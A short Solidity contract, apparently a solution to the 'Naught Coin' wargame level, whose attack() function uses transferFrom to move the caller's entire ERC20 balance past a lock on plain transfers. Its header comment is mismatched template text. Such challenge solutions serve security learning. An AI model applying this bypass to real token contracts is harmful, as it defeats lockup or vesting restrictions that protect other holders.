// SPDX-License-Identifier: GPL-3.0

pragma solidity >=0.8.2 <0.9.0;

/**
 * @title Storage
 * @dev Store & retrieve value in a variable
 * @custom:dev-run-script ./scripts/deploy_with_ethers.ts
 */

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

contract NaughtCoinAttacker {
    IERC20 naughtCoinAttacker;

    constructor(address _naughtCoinAttacker) {
        naughtCoinAttacker = IERC20(_naughtCoinAttacker);
    }

    function attack() external {
        naughtCoinAttacker.transferFrom(
            msg.sender,
            address(this),
            naughtCoinAttacker.balanceOf(msg.sender)
        );
    }
}
